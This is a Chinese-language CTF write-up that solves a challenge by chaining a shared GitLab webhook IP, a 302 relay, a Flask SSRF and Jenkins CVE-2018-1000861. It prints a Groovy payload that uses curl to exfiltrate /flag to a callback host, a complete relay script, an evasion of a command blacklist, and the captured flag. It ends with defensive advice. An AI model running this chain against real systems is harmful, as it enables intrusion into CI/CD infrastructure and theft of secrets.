# hooks

## 题目简述

题目模拟一种常见的混合 CI/CD 架构：GitHub、GitLab 等 SaaS 源代码托管平台需要向企业内网的 Jenkins 发送 Webhook，企业便在边界防火墙上放行这些平台的出口 IP。这里对外只开放 Nginx 网关，内网还有 Flask 请求代理和 Jenkins，目标是借合法的 GitLab Webhook 穿过源 IP 白名单，再利用 Jenkins 漏洞读取 `/flag`。

仓库中的网络结构如下：

- Nginx 对外监听 80 端口，只放行题目硬编码的 GitLab、GitHub 出口网段，其余来源一律拒绝；
- Flask 与 Jenkins 均不直接映射到宿主机，三者只在 Docker 内部网络互通；
- Flask 的 `redirect_url` 参数可令服务器执行 `requests.get()`，形成一个会把响应正文回显的 SSRF；
- Jenkins 镜像是 `vulhub/jenkins:2.138`，包含可利用 CVE-2018-1000861 的旧版本与配套插件。

[Webhook 滥用研究原文](https://www.paloaltonetworks.com/blog/cloud-security/repository-webhook-abuse-access-ci-cd-systems-at-scale/)指出，SaaS SCM 的出口网段由所有租户共享，因此“请求来自 GitLab IP”只能证明请求经过 GitLab 基础设施，不能证明它来自本企业的仓库。攻击者可在自己的项目中配置 Webhook，把 GitLab 变成受信任的网络跳板；研究人员还验证了 GitLab 会跟随重定向并展示最终响应，这正是本题网络设计的原型。

## 解题过程

### 还原三段请求链

直接访问题目网关会被 Nginx 的 `deny all` 拒绝，必须让请求从允许的 SCM 网段发出。GitLab 项目 Webhook 可以满足这一点，但它发出的事件请求是 POST，而题目 Flask 对 POST 固定返回 `Method Not Allowed`：

```python
if request.method == 'POST':
    return "Method Not Allowed"
```

GitLab 会跟随 HTTP 302 重定向，并按常见客户端行为把后续请求改为 GET。因此可在公网主机部署一个中转端点：GitLab 先 POST 到中转端点，中转端点返回 `302 Location: http://题目网关/?redirect_url=...`，GitLab 随后以 GET 访问题目网关。第二次请求仍由 GitLab 发出，所以能通过 Nginx 的源 IP 白名单。

进入 Flask 后，`redirect_url` 只经过 `bash`、`rm`、`whoami`、`wget`、`dnslog` 五个区分大小写的子串检查，随后被原样交给 `requests.get()`。容器内 DNS 可以解析服务名 `jenkins`，故令该参数指向 `http://jenkins:8080/...`，即可从 Flask 访问没有公网端口的 Jenkins。Flask 还会把 Jenkins 的状态码和响应正文拼回 HTTP 响应，便于调试。

整条链路是：

```text
攻击者配置 GitLab Webhook
    -> GitLab POST 公网中转站
    -> 中转站返回 302
    -> GitLab GET 题目网关
    -> Nginx 按 GitLab 出口 IP 放行
    -> Flask GET redirect_url
    -> 内网 Jenkins
```

### 构造 Jenkins 命令执行 URL

[Jenkins 官方公告](https://www.jenkins.io/security/advisory/2018-12-05/#SECURITY-595)说明，CVE-2018-1000861 的根因是 Stapler Web 框架按命名约定反射路由 Java 对象，攻击者可用特制 URL 调到原本不应暴露的 getter、`do*` 方法或字段。受影响范围包括 Jenkins weekly 2.153 及之前版本、LTS 2.138.3 及之前版本；修复版本是 weekly 2.154、LTS 2.138.4 或 2.150.1。因此题目的 2.138 镜像处于受影响范围。

本题使用的危险路由为：

```text
/securityRealm/user/admin/descriptorByName/
org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/
checkScript
```

把上面三行拼成一个连续路径，并提供 `sandbox=true` 与 `value=<Groovy>`。`checkScript` 本是表单校验方法，会在真正进入 Groovy 沙箱前编译脚本以检查语法；旧版本的这一步位于沙箱外。借 Groovy 元编程在类构造期间执行命令，即可把“未授权调用校验方法”升级为 RCE：

```groovy
public class x {
    public x() {
        "curl -X POST --data-binary @/flag http://CALLBACK_HOST/collect".execute()
    }
}
```

命令使用 `curl`，不会命中 Flask 黑名单；`--data-binary @/flag` 把 flag 原样作为 POST 请求体送到自建 HTTP 回连服务。这里不应照抄旧 WP 中已经失效的公网 IP 和回连域名，应替换为自己当前可接收请求的地址。

### 部署 302 中转端点

下面的 Flask 程序逐层编码查询参数，避免手写超长 URL 时漏掉 `&`、空格或花括号。两个环境变量分别是题目公网网关和接收 flag 的回连地址；中转站的公网地址只需在 GitLab Webhook 配置中填写：

```python
import os
from urllib.parse import urlencode

from flask import Flask, redirect


app = Flask(__name__)

gateway = os.environ["TARGET_GATEWAY"].rstrip("/")
callback = os.environ["CALLBACK_URL"]

groovy = (
    "public class x { public x() { "
    f'"curl -X POST --data-binary @/flag {callback}".execute()'
    " } }"
)

jenkins_path = (
    "/securityRealm/user/admin/descriptorByName/"
    "org.jenkinsci.plugins.scriptsecurity.sandbox.groovy."
    "SecureGroovyScript/checkScript"
)
jenkins_url = "http://jenkins:8080" + jenkins_path + "?" + urlencode(
    {
        "sandbox": "true",
        "value": groovy,
    }
)
gateway_url = gateway + "/?" + urlencode(
    {
        "redirect_url": jenkins_url,
    }
)


@app.post("/redirect")
def relay():
    return redirect(gateway_url, code=302)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

例如在公网主机上启动：

```bash
export TARGET_GATEWAY='http://TARGET_GATEWAY'
export CALLBACK_URL='http://CALLBACK_HOST/collect'
python3 relay.py
```

然后在自己的 GitLab 项目中添加 Webhook，URL 填为 `http://PUBLIC_RELAY:5000/redirect`，选择任一方便手动触发的事件并测试投递。GitLab 投递记录中的关键字段如下；原截图里的临时公网 IP 已改为语义化占位符：

```text
Request:  POST http://PUBLIC_RELAY:5000/redirect
Event:    Push Hook
Response: 200 OK
Body:     redirect_url:http://jenkins:8080/securityRealm/user/admin/
          descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.
          SecureGroovyScript/checkScript?...
```

返回正文出现内网 Jenkins 的 `checkScript` 路径，证明 POST → 302 → GET → SSRF 链已经打通。Jenkins 编译 Groovy 载荷时执行 `curl`，回连服务收到如下 HTTP 请求；请求体长度为 55 字节，正文即为 flag：

```text
REQUEST_METHOD:  POST
CONTENT_LENGTH:  55
HTTP_USER_AGENT: curl/7.52.1

ACTF{cicd_MX0XKe_security_8o5Agr_is_bsreH3_interesting}
```

## 方法总结

本题的核心不是单独的 SSRF 或单独的 Jenkins CVE，而是多个看似有限的能力跨越信任边界后形成完整攻击链：共享的 SCM 出口 IP 绕过网关白名单，302 把不可用的 POST 变成可用的 GET，Flask 的 `redirect_url` 把外部请求转入 Docker 内网，Stapler 动态路由与沙箱外 Groovy 校验最终提供命令执行。

防护时也应分层处理：不能把 SaaS 平台共享出口 IP 当作租户身份；Webhook 接收端应校验每个仓库独立的签名或密钥，只暴露必要路径，禁止任意重定向到内部端点；SSRF 必须在解析 DNS 后限制目标地址，并对每次重定向重新校验；Jenkins 及插件则应及时升级、关闭匿名访问。这样即使其中一层出错，也不会直接贯通到内网 CI/CD 控制面。
